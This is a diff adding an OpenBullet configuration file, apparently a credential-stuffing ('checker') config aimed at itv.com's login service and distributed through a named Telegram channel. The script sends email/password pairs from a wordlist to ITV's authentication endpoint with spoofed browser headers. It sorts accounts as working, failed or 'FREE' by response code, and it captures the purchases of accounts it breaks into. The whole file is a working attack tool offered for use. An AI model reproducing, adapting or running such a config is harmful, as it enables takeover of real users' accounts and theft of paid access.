@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "itv.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-27T22:48:23.8881128+04:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 468991969
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#rnd FUNCTION RandomString "?u?u?l?d?u?u?u?u?d?u?u?u?u?l?l?l?l?u?d?l" -> VAR "rnd" 
+
+#Login REQUEST POST "https://auth.prd.user.itv.com/auth" 
+  CONTENT "{\"grant_type\":\"password\",\"nonce\":\"<rnd>\",\"username\":\"<USER>\",\"password\":\"<PASS>\",\"scope\":\"content\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Host: auth.prd.user.itv.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: application/vnd.user.auth.v2+json" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Origin: https://www.itv.com" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://www.itv.com/" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "400" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" EqualTo "200" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "purchased\":[]" 
+
+#purchased PARSE "<SOURCE>" LR "purchased\":" "," CreateEmpty=FALSE -> CAP "purchased" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
